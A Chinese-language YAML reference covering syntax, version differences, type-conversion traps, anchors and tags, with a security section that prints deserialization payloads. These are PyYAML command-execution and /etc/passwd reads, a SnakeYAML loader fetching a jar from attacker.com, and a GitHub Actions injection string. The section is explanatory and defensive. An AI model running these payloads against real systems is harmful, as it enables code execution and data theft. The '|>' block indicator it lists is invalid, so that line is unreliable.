# YAML

> YAML（YAML Ain't Markup Language）用缩进表示层级，比 JSON 更人可读。Docker Compose、Ansible、Kubernetes、GitHub Actions 都用它做配置文件。

---

## 基本语法

```yaml
# 这是注释（用 # 号）
# 缩进必须是空格，不能用 Tab

# 键值对
name: Alice
age: 25
is_admin: false
bio: null            # null 也可写 ~

# 对象（缩进表示层级）
user:
  name: Alice
  address:
    city: Beijing
    zipcode: "100000"

# 行内写法（等同于上面）
user: {name: Alice, address: {city: Beijing, zipcode: "100000"}}

# 数组（列表）
skills:
  - Python
  - Docker
  - SQL

# 行内数组
skills: [Python, Docker, SQL]

# 对象数组
servers:
  - name: web01
    ip: 10.0.0.1
    roles:
      - web
      - cache
  - name: db01
    ip: 10.0.0.2
    roles:
      - database
```

**YAML 1.1 vs 1.2 差异：**

| 差异点 | YAML 1.1 (2005) | YAML 1.2 (2009) |
|--------|-----------------|-----------------|
| 布尔值 | `yes/no/on/off` 都解析为布尔 | 只认 `true/false` |
| 八进制 | `0700` 解析为 448 | `0700` 解析为字符串 "0700"（前导零非标） |
| JSON 兼容 | 不完全 | 声称 JSON 是其子集 |
| 主要使用者 | Ansible, Docker Compose | Kubernetes, GitHub Actions |

这个差异导致一个经典的坑：`country: NO` 在 Ansible（YAML 1.1）中会被解析为布尔 `false`，必须加引号写 `country: "NO"`。

---

## 数据类型与隐式转换

| 类型 | 示例 | 注意 |
|------|------|------|
| 字符串 | `name: Alice` | 一般不加引号 |
| 多行字符串 | `|` 保留换行，`>` 折叠换行 | 见下文 |
| 整数 | `age: 25` | 支持二进制 `0b101`，八进制 `0o31`，十六进制 `0x19` |
| 浮点 | `pi: 3.14` | 支持科学计数法 `6.02e23` |
| 布尔 | `true`, `false` | `True/False`, `TRUE/FALSE`, `yes/no`, `on/off` 都算（1.1） |
| 空值 | `null`, `~` | `NULL`, `Null` 也算 |
| 日期时间 | `2024-01-15` | 自动识别为 `datetime.date` 对象 |
| 时间戳 | `2024-01-15T10:30:00+08:00` | 自动识别为 `datetime.datetime` |

**隐式类型转换陷阱：**

```yaml
# 这些值会被自动转换，可能导致意外行为
version: 1.0              # 浮点数 1.0，不是字符串 "1.0"
port: 8080                # 整数，安全
port_str: "8080"          # 字符串，安全
countries:                # NO → false, YES → true
  - US
  - NO                    # 解析为 false，不是 "挪威"！
  - YES                   # 解析为 true
region_code: 01234        # YAML 1.1 → 八进制 668；YAML 1.2 → 字符串
hash: d3adbe3f            # 纯字母数字 → 字符串；看起来像十六进制但不是 → 安全
```

建议：容易歧义的值一律加引号，不在这个上面省事。

---

## 多行字符串

```yaml
# |  字面块（Literal Block）— 保留换行符
script: |
  #!/bin/bash
  echo "line 1"
  echo "line 2"
# 实际值："#!/bin/bash\necho \"line 1\"\necho \"line 2\"\n"

# >  折叠块（Folded Block）— 换行变成空格
description: >
  这是一个很长的描述文本，
  换行会被折叠成一个空格。
  段落之间有空行才会保留换行。
# 实际值："这是一个很长的描述文本，换行会被折叠成一个空格。\n段落之间有空行才会保留换行。\n"

# 控制末尾换行
script: |+       # 保留末尾所有换行
script: |-       # 删除末尾单个换行
script: |>       # 保留换行 + 删除末尾换行
```

---

## 高级语法

### 锚点和别名

```yaml
# & 定义锚点，* 引用，<< 合并映射
default_settings: &defaults
  timeout: 30
  retries: 3
  log_level: info

service_a:
  <<: *defaults        # 合并 default_settings 的所有键值
  name: ServiceA
  timeout: 60          # 覆盖 timeout

service_b:
  <<: *defaults
  name: ServiceB
```

`<<` 合并键是 YAML 1.1 的扩展，不是 JSON 子集。注意循环引用会导致解析栈溢出。

### 标签（Tags）

```yaml
# 标签改变 YAML 的数据类型解析方式
value: 42                      # 整数
value: !!str 42                # 强制为字符串 "42"

# 自定义标签（反序列化攻击的入口）
!!python/object:my_module.MyClass {attr: value}

# 集合标签
!!set {a, b, c}                # 无序集合，Python 解析为 set
!!omap                        # 有序映射（OrderedDict）
  - key1: value1
  - key2: value2
```

### 指令（Directives）

```yaml
%YAML 1.2                    # 指定 YAML 版本
---                          # 文档分隔符
# 第一个文档内容
---
# 第二个文档内容
...                          # 文档结束标记
```

### 环境变量引用

部分工具支持从环境变量取值（不是 YAML 标准，是工具的扩展）：

```yaml
# docker-compose.yml / K8s
services:
  db:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: ${DB_PASS}
      MYSQL_DATABASE: ${DB_NAME:-mydb}        # :.- 默认值
      MYSQL_PORT: ${DB_PORT:?必须设置端口}     # :? 必填，空则报错
```

---

## 安全：YAML 反序列化漏洞

YAML 可以表达任意对象，这既是它的强大之处，也是它最大的安全风险。

### Python（PyYAML）

```python
import yaml

# 危险：yaml.load() 默认支持 !!python 标签
payload = """
!!python/object/apply:os.system ["whoami"]
"""
yaml.load(payload)       # 任意命令执行

# 更多 Python Payload
!!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]
!!python/object/new:builtins.eval ["__import__('os').system('id')"]
!!python/object/apply:builtins.open ["/flag"]

# 防御
data = yaml.safe_load(payload)                    # 只支持基础类型
data = yaml.load(payload, Loader=yaml.FullLoader)  # PyYAML 5.1+ 禁用自定义标签
```

**`safe_load()` vs `load()`：**

| | `yaml.safe_load()` | `yaml.load()` (默认) |
|---|---|---|
| 支持 `!!python/...` | 不支持 | 支持（危险） |
| 支持基本类型 | 支持 | 支持 |
| 适用 | 配置文件、用户输入 | 仅受信任的内部数据 |
| 风险 | 无 | 远程代码执行 |

### Ruby（Psych）

```yaml
# Ruby YAML 反序列化（Psych / Syck）
--- !ruby/object:Gem::Installer
...

--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
...
```

### Java（SnakeYAML）

```yaml
# Java SnakeYAML 反序列化
!!javax.script.ScriptEngineManager
  [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
```

### 其他安全风险

**CVE-2019-1003018（Jenkins Job DSL 插件）：** 通过 YAML 的 `!!` 标签实现任意代码执行，CVSS 9.8。

**GitHub Actions 注入：** 如果 Workflow 中 YAML 值是从 PR 标题等用户可控数据动态生成的，攻击者可以注入额外的 YAML 字段：

```yaml
# PR 标题：test"; run: echo "injected
name: "${PR_TITLE}"
# 展开后破坏了 YAML 结构，注入新命令
```

| 语言 | 安全库 / 方法 |
|------|-------------|
| Python | `yaml.safe_load()` 或 `ruamel.yaml`（`YAML(typ='safe')`） |
| Ruby | `YAML.safe_load()`（Ruby 2.5+） |
| Java | SnakeYAML `SafeConstructor` 或改用 Jackson YAML |
| Go | `gopkg.in/yaml.v3` 默认不解析标签 |
| Node.js | `js-yaml` 的 `safeLoad()` |

---

## 常见用途

| 场景 | 文件 |
|------|------|
| Docker Compose | `docker-compose.yml` / `compose.yaml` |
| Kubernetes | `deployment.yaml`, `service.yaml`, `configmap.yaml` |
| Ansible | `playbook.yml`, `roles/`, `inventory/` |
| GitHub Actions | `.github/workflows/ci.yml` |
| CI/CD | `.gitlab-ci.yml`, `drone.yml`, `bitbucket-pipelines.yml` |
| 应用配置 | Spring Boot `application.yml`, Home Assistant |
| API 规范 | OpenAPI/Swagger `.yaml` |
| 文档元数据 | Markdown Frontmatter（`---` 包裹的 YAML 头部） |

---

## YAML vs JSON vs XML

| | YAML | JSON | XML |
|---|---|---|---|
| 可读性 | 最好 | 好 | 差（标签冗余） |
| 注释 | 支持 `#` | 不支持 | 支持 `<!-- -->` |
| 数据类型 | 丰富（日期、布尔识别、集合） | 基础（数字/字符串/布尔/null） | 全部是字符串 |
| 解析安全 | `load()` 有代码执行风险 | 无（纯数据） | 外部实体（XXE）风险 |
| 缩进 | 严格（空格，不能 Tab） | 无要求 | 无要求 |
| 引用/复用 | 锚点 `&` 和别名 `*` | 无原生支持 | 实体 `&entity;`（但那是另一回事） |
| 多文档 | 一个文件多个 `---` 分隔 | 不支持（NDJSON 变通） | 不支持（DTD 可以组合） |
| 适用 | 配置文件、声明式编排 | API 数据交换 | 文档、SOAP、企业系统 |
